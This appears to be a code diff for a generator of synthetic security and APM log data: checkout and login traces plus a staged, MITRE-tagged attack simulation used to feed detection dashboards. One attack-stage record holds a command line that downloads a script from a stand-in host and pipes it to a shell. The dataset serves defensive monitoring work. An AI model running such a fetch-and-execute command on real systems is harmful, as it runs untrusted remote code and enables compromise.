+            waf_score="99",
+            hostname=TOOL_SHELL_HOST,
+            slow_request=True,
+            offset=99,
+        ),
+    ])
+
+    # Octo APM demo: one service-scoped dataset that carries correlated logs,
+    # APM span hierarchy, and metric samples for the dedicated APM dashboard.
+    checkout_trace = "trace_octo_apm_checkout_001"
+    checkout_root_span = "span_octo_checkout_root"
+    events.extend([
+        application_event(
+            "octo-apm-demo",
+            message="checkout request accepted",
+            url="/octo/checkout",
+            http_method="POST",
+            status_code="200",
+            response_time_ms=1180,
+            trace_id=checkout_trace,
+            span_id=checkout_root_span,
+            parent_span_id="",
+            span_name="HTTP POST /octo/checkout",
+            span_attributes="route=/octo/checkout cart.items=3 customer.tier=gold",
+            workflow_id="checkout",
+            workflow_step="entry",
+            metric_name="http.server.duration",
+            metric_value="1180",
+            metric_unit="ms",
+            hostname="octo-apm-demo-frontend-01",
+            offset=100,
+        ),
+        application_event(
+            "octo-apm-demo",
+            message="inventory reservation span completed",
+            url="/octo/internal/inventory/reserve",
+            http_method="POST",
+            status_code="200",
+            response_time_ms=420,
+            trace_id=checkout_trace,
+            span_id="span_octo_inventory_reserve",
+            parent_span_id=checkout_root_span,
+            span_name="POST /inventory/reserve",
+            span_attributes="component=inventory sku=OCTO-DRONE-7 reservation=ok",
+            db_target="oracle_atp",
+            db_statement="update inventory set reserved = reserved + :qty where sku = :sku",
+            db_elapsed_ms=420,
+            workflow_id="checkout",
+            workflow_step="inventory",
+            metric_name="apm.span.duration",
+            metric_value="420",
+            metric_unit="ms",
+            hostname="octo-apm-demo-api-01",
+            offset=101,
+        ),
+        application_event(
+            "octo-apm-demo",
+            message="payment authorization timeout",
+            level="ERROR",
+            url="/octo/internal/payment/authorize",
+            http_method="POST",
+            status_code="504",
+            response_time_ms=2860,
+            trace_id=checkout_trace,
+            span_id="span_octo_payment_auth",
+            parent_span_id=checkout_root_span,
+            span_name="POST /payment/authorize",
+            span_attributes="component=payment gateway=demo-pay timeout=true",
+            error_type="PaymentGatewayTimeout",
+            slow_request=True,
+            workflow_id="checkout",
+            workflow_step="payment",
+            java_apm_path="/api/java-apm/payment/authorize",
+            java_apm_status_code=504,
+            java_apm_latency_ms=2860,
+            java_apm_error_type="PaymentGatewayTimeout",
+            metric_name="apm.service.errors",
+            metric_value="1",
+            metric_unit="count",
+            hostname="octo-apm-demo-api-02",
+            offset=102,
+        ),
+        application_event(
+            "octo-apm-demo",
+            message="checkout rollback wrote audit entry",
+            level="WARN",
+            url="/octo/internal/audit/checkout-rollback",
+            http_method="POST",
+            status_code="200",
+            response_time_ms=310,
+            trace_id=checkout_trace,
+            span_id="span_octo_checkout_rollback",
+            parent_span_id="span_octo_payment_auth",
+            span_name="INSERT checkout_rollback_audit",
+            span_attributes="db.statement=insert rollback_reason=payment_timeout",
+            db_target="oracle_atp",
+            db_statement="insert into checkout_rollback_audit(trace_id, rollback_reason) values(:trace_id, :reason)",
+            db_elapsed_ms=310,
+            workflow_id="checkout",
+            workflow_step="audit",
+            metric_name="apm.db.calls",
+            metric_value="1",
+            metric_unit="count",
+            hostname="octo-apm-demo-db-client-01",
+            offset=103,
+        ),
+        application_event(
+            "octo-drone-shop",
+            message="java app-server sidecar payment authorization failed",
+            level="ERROR",
+            url="/api/orders/checkout",
+            http_method="POST",
+            status_code="504",
+            response_time_ms=2910,
+            trace_id=checkout_trace,
+            span_id="span_octo_java_payment_sidecar",
+            parent_span_id="span_octo_payment_auth",
+            span_name="POST octo-java-app-server /api/java-apm/payment/authorize",
+            span_attributes="peer.service=octo-java-app-server app_server=spring-boot-embedded-tomcat",
+            error_type="PaymentGatewayTimeout",
+            slow_request=True,
+            workflow_id="checkout",
+            workflow_step="java-payment",
+            java_apm_path="/api/java-apm/payment/authorize",
+            java_apm_status_code=504,
+            java_apm_latency_ms=2860,
+            java_apm_error_type="PaymentGatewayTimeout",
+            hostname="octo-drone-shop-frontend-01",
+            offset=104,
+        ),
+    ])
+
+    attack_trace = "trace_octo_apm_attack_001"
+    attack_run_id = "run-octo-attack-lab-001"
+    attack_request_id = "req_octo_attack_001"
+    attack_source_ip = "203.0.113.77"
+    attack_redirect_url = "https://pay-update.example.test/checkout/session"
+    attack_stages = [
+        {
+            "service": "octo-drone-shop",
+            "message": "OCI API Gateway route policy evaluated the attack-lab request before backend forwarding",
+            "level": "WARN",
+            "stage": "api_gateway_edge_control",
+            "tactic": "Initial Access",
+            "technique_id": "T1190",
+            "technique": "Exploit Public-Facing Application",
+            "type": "api_gateway_policy_detection",
+            "severity": "high",
+            "url": "/api/shop/attack/simulate",
+            "status": "200",
+            "span": "span_octo_attack_api_gateway_edge",
+            "parent": "",
+            "host": "oci-api-gateway-public",
+            "role": "public-api-gateway",
+            "instance": "ocid1.apigatewaydeployment.oc1.iad.demoattackgw01",
+            "destination_ip": "10.42.20.165",
+            "destination_port": 443,
+            "lotl": "api-gateway-policy",
+            "osquery_query": "api-gateway-route-policy",
+            "osquery_finding": "API Gateway policy and quota telemetry correlated with the same attack id and trace",
+            "compromised": False,
+            "oci.api_gateway.name": "octo-public-api-gateway",
+            "oci.api_gateway.scope": "public",
+            "oci.api_gateway.deployment_id": "ocid1.apigatewaydeployment.oc1.iad.demoattackgw01",
+            "oci.api_gateway.route": "/api/shop/attack/simulate",
+            "oci.api_gateway.route_id": "public-attack-simulate",
+            "oci.api_gateway.route_family": "shop_attack",
+            "oci.api_gateway.request_id": "gw-req_octo_attack_001",
+            "oci.api_gateway.action": "allow",
+            "oci.api_gateway.policy.decision": "suspicious_burst_observed",
+            "oci.api_gateway.latency_ms": 34,
+            "oci.api_gateway.rate_limit.limit": 120,
+            "oci.api_gateway.rate_limit.remaining": 87,
+            "oci.api_gateway.threat_signal": "attack_lab_probe",
+        },
+        {
+            "service": "octo-drone-shop",
+            "message": "Attack lab initial access reached the shop edge route",
+            "level": "WARN",
+            "stage": "initial_access",
+            "tactic": "Initial Access",
+            "technique_id": "T1190",
+            "technique": "Exploit Public-Facing Application",
+            "type": "public_app_exploit",
+            "severity": "high",
+            "url": "/shop/products",
+            "status": "200",
+            "span": "span_octo_attack_initial_access",
+            "parent": "",
+            "host": "octo-shop-vm-01",
+            "role": "shop-frontend",
+            "instance": "ocid1.instance.oc1.iad.demoattackshop01",
+            "destination_ip": "203.0.113.10",
+            "destination_port": 443,
+            "lotl": "curl",
+            "osquery_query": "unexpected-listeners",
+            "osquery_finding": "public endpoint probe reached shop listener through the load balancer",
+            "compromised": False,
+        },
+        {
+            "service": "octo-drone-shop",
+            "message": "Compromised VM executed a shell-like payload from the app tier",
+            "level": "ERROR",
+            "stage": "vm_compromise",
+            "tactic": "Execution",
+            "technique_id": "T1059",
+            "technique": "Command and Scripting Interpreter",
+            "type": "compromised_vm",
+            "severity": "critical",
+            "url": "/api/shop/attack/simulate",
+            "status": "500",
+            "span": "span_octo_attack_vm_compromise",
+            "parent": "span_octo_attack_initial_access",
+            "host": "octo-shop-vm-01",
+            "role": "shop-frontend",
+            "instance": "ocid1.instance.oc1.iad.demoattackshop01",
+            "destination_ip": "10.42.20.165",
+            "destination_port": 8080,
+            "lotl": "bash",
+            "process.name": "bash",
+            "process.command_line": "bash -lc curl -fsS https://pay-update.example.test/payload.sh | sh",
+            "osquery_query": "lotl-processes",
+            "osquery_finding": "shell-like process launched from the application host during the lab run",
+            "compromised": True,
+        },
+        {
+            "service": "octo-apm-demo",
+            "message": "Payment form interception detected during checkout",
+            "level": "ERROR",
+            "stage": "payment_interception",
+            "tactic": "Credential Access",
+            "technique_id": "T1056.001",
+            "technique": "Keylogging",
+            "type": "payment_data_interception",
+            "severity": "critical",
+            "url": "/shop/checkout/payment",
+            "status": "200",
+            "span": "span_octo_attack_payment_interception",
+            "parent": "span_octo_attack_vm_compromise",
+            "host": "octo-shop-vm-01",
+            "role": "shop-frontend",
+            "instance": "ocid1.instance.oc1.iad.demoattackshop01",
+            "destination_ip": "10.42.20.165",
+            "destination_port": 443,
+            "lotl": "javascript",
+            "osquery_query": "recent-processes",
+            "osquery_finding": "checkout form overlay produced payment interception telemetry",
+            "compromised": True,
+            "payment.interception.detected": True,
+            "payment.provider": "simulated",
+            "payment.status": "intercepted",
+            "payment.card_brand": "visa",
+            "payment.card_last4": "4242",
+            "payment.risk_score": 97,
+        },
+        {
+            "service": "octo-apm-demo",
+            "message": "Suspicious payment redirect sent checkout traffic to an untrusted host",
+            "level": "ERROR",
+            "stage": "payment_redirect",
+            "tactic": "Credential Access",
+            "technique_id": "T1557",
+            "technique": "Adversary-in-the-Middle",
+            "type": "payment_redirect",
+            "severity": "critical",
+            "url": "/shop/checkout/payment/redirect",
+            "status": "302",
+            "span": "span_octo_attack_payment_redirect",
+            "parent": "span_octo_attack_payment_interception",
+            "host": "octo-shop-vm-01",
+            "role": "shop-frontend",
+            "instance": "ocid1.instance.oc1.iad.demoattackshop01",
+            "destination_ip": "198.51.100.44",
+            "destination_port": 443,
+            "lotl": "nginx-rewrite",
+            "osquery_query": "suspicious-shell-history",
+            "osquery_finding": "redirect rule simulation points payment flow to a suspicious host",
+            "compromised": True,
+            "payment.redirect.detected": True,
+            "payment.redirect.url": attack_redirect_url,
+            "http.redirect.location": attack_redirect_url,
+        },
+        {
+            "service": "enterprise-crm-portal",
+            "message": "Compromised shop path pivoted toward the CRM admin service",
+            "level": "WARN",
+            "stage": "crm_pivot",
+            "tactic": "Lateral Movement",
+            "technique_id": "T1021.004",
+            "technique": "Remote Services: SSH",
+            "type": "crm_pivot",
+            "severity": "high",
+            "url": "/api/admin/orders",
+            "status": "401",
+            "span": "span_octo_attack_crm_pivot",
+            "parent": "span_octo_attack_payment_redirect",
+            "host": "octo-crm-vm-01",
+            "role": "crm-admin",
+            "instance": "ocid1.instance.oc1.iad.demoattackcrm01",
+            "destination_ip": "10.42.20.122",
+            "destination_port": 8080,
+            "lotl": "curl",
+            "osquery_query": "lotl-processes",
+            "osquery_finding": "CRM host observed suspicious admin API probing from the compromised app tier",
+            "compromised": True,
+        },
+        {
+            "service": "octo-apm-demo",
+            "message": "Payment telemetry exfiltration attempt correlated with checkout redirect",
+            "level": "ERROR",
+            "stage": "exfiltration",
+            "tactic": "Exfiltration",
+            "technique_id": "T1041",
+            "technique": "Exfiltration Over C2 Channel",
+            "type": "payment_exfiltration",
+            "severity": "critical",
+            "url": "/shop/checkout/payment/callback",
+            "status": "503",
+            "span": "span_octo_attack_exfiltration",
+            "parent": "span_octo_attack_payment_redirect",
+            "host": "octo-shop-vm-01",
+            "role": "shop-frontend",
+            "instance": "ocid1.instance.oc1.iad.demoattackshop01",
+            "destination_ip": "198.51.100.200",
+            "destination_port": 443,
+            "lotl": "curl",
+            "osquery_query": "process-open-sockets",
+            "osquery_finding": "outbound callback to suspicious payment collection endpoint",
+            "compromised": True,
+            "payment.interception.detected": True,
+            "payment.redirect.detected": True,
+            "payment.card_last4": "4242",
+            "network.bytes_out": 4812,
+        },
+    ]
+    for offset, stage in enumerate(attack_stages, start=105):
+        base_event = application_event(
+            stage["service"],
+            message=stage["message"],
+            level=stage["level"],
+            url=stage["url"],
+            http_method="POST" if stage["stage"] != "initial_access" else "GET",
+            status_code=stage["status"],
+            response_time_ms=900 + (offset - 105) * 240,
+            client_ip=attack_source_ip,
+            user_agent="curl/8.4.0 octo-attack-lab",
+            trace_id=attack_trace,
+            span_id=stage["span"],
+            parent_span_id=stage["parent"],
+            span_name=f"security.attack.{stage['stage']}",
+            span_attributes=f"attack.id=attack-octo-demo-001 mitre={stage['technique_id']}",
+            error_type=stage["type"] if stage["level"] == "ERROR" else None,
+            slow_request=stage["level"] == "ERROR",
+            workflow_id="admin-threat-simulation",
+            workflow_step=stage["stage"],
+            request_id=attack_request_id,
+            run_id=attack_run_id,
+            hostname=stage["host"],
+            offset=offset,
+        )
+        events.append({
+            **base_event,
+            "security.attack.id": "attack-octo-demo-001",
+            "security.attack.stage": stage["stage"],
+            "security.attack.type": stage["type"],
+            "security.attack.detected": True,
+            "security.severity": stage["severity"],
+            "mitre.tactic": stage["tactic"],
+            "mitre.technique_id": stage["technique_id"],
+            "mitre.technique": stage["technique"],
+            "attack.entry_point": stage["url"],
+            "attack.lotl_binary": stage["lotl"],
+            "source.ip": attack_source_ip,
+            "server.address": stage["host"],
+            "destination.ip": stage["destination_ip"],
+            "destination.port": stage["destination_port"],
+            "network.protocol.name": "https" if stage["destination_port"] == 443 else "http",
+            "osquery.query": stage["osquery_query"],
+            "osquery.finding": stage["osquery_finding"],
+            "osquery.sql": "SELECT pid, name, path, cmdline FROM processes WHERE start_time > strftime('%s','now','-30 minutes');",
+            "osquery.result_count": 1,
+            "cloud.instance.id": stage["instance"],
+            "host.name": stage["host"],
+            "host.role": stage["role"],
+            "vm.compromised": stage["compromised"],
+            **{key: value for key, value in stage.items() if "." in key},
+        })
+
+    login_trace = "trace_octo_apm_login_001"
+    login_root_span = "span_octo_login_root"
+    events.extend([
+        application_event(
+            "octo-apm-demo",
+            message="login request completed",
+            url="/octo/login",
+            http_method="POST",
+            status_code="401",
+            response_time_ms=640,
+            client_ip=brute_force_ip,
+            user_agent="Mozilla/5.0 (compatible; Hydra/9.0)",
+            user="octo-admin",
+            trace_id=login_trace,
+            span_id=login_root_span,
+            span_name="HTTP POST /octo/login",
+            span_attributes="auth.result=failed mfa.required=true",
+            attack_type="broken_auth",
+            attack_severity="high",
+            workflow_id="auth",
+            workflow_step="login",
+            metric_name="http.server.requests",
+            metric_value="1",
+            metric_unit="count",
+            hostname="octo-apm-demo-frontend-01",
+            offset=105,
+        ),
+        application_event(
+            "octo-apm-demo",
+            message="credential lookup span completed",
+            url="/octo/internal/auth/credentials",
+            http_method="POST",
+            status_code="200",
+            response_time_ms=390,
+            client_ip=brute_force_ip,
+            user="octo-admin",
+            trace_id=login_trace,
+            span_id="span_octo_auth_db_lookup",
+            parent_span_id=login_root_span,
+            span_name="SELECT users by username",
+            span_attributes="db.statement=select users username=octo-admin",
+            db_target="oracle_atp",
+            db_statement="select id, password_hash from users where username = :username",
+            db_elapsed_ms=390,
+            workflow_id="auth",
+            workflow_step="credentials",
+            metric_name="apm.db.duration",
+            metric_value="390",
+            metric_unit="ms",
+            hostname="octo-apm-demo-db-client-01",
+            offset=106,
+        ),
+        application_event(
+            "octo-apm-demo",
+            message="APM metric sample p95 latency",
+            url="/octo/metrics",
+            status_code="200",
+            response_time_ms=20,
+            trace_id="trace_octo_apm_metric_001",
+            span_id="span_octo_metric_p95",
+            span_kind="METRIC",
+            span_name="metric http.server.duration.p95",
+            span_attributes="metric.window=5m route=/octo/checkout",
+            workflow_id="observability",
+            workflow_step="metrics",
+            metric_name="http.server.duration.p95",
+            metric_value="2860",
+            metric_unit="ms",
+            hostname="octo-apm-demo-metrics-01",
+            offset=107,
+        ),
+        application_event(
+            "octo-apm-demo",
+            message="APM metric sample error count",
+            url="/octo/metrics",
+            status_code="200",
+            response_time_ms=18,
+            trace_id="trace_octo_apm_metric_002",
+            span_id="span_octo_metric_errors",
+            span_kind="METRIC",
+            span_name="metric apm.service.errors",
+            span_attributes="metric.window=5m route=/octo/checkout",
+            workflow_id="observability",
+            workflow_step="metrics",
+            metric_name="apm.service.errors",
+            metric_value="1",
+            metric_unit="count",
+            hostname="octo-apm-demo-metrics-01",
+            offset=108,
+        ),
+    ])
+
     return events
 
 
@@ -4680,6 +6642,8 @@ def main():
     lb_events = generate_lb_access_events()
     webapp_events = generate_webapp_events()
     application_events = generate_application_events()
+    vcn_flow_events = generate_vcn_flow_events()
+    network_firewall_events = generate_network_firewall_events()
 
     generated_sets = {
         "oci_audit.jsonl": oci_events,
@@ -4695,6 +6659,8 @@ def main():
         "lb_access.jsonl": lb_events,
         "webapp_security.jsonl": webapp_events,
         "application_logs.jsonl": application_events,
+        "vcn_flow.jsonl": vcn_flow_events,
+        "network_firewall.jsonl": network_firewall_events,
     }
 
     # Write NDJSON files
@@ -4715,9 +6681,11 @@ def main():
 
     if args.validate:
         print("\n  Validating query coverage...")
+        from query_artifacts import is_saved_search_query_file
+
         query_files = [
             path for path in QUERIES_DIR.rglob("*.json")
-            if path.name not in {"manifest.json", "catalog.json", "dashboard_inventory.json"}
+            if is_saved_search_query_file(path)
         ]
         print(f"  Found {len(query_files)} query files")
         print("  (Full validation requires OCI LA to parse and match fields)")
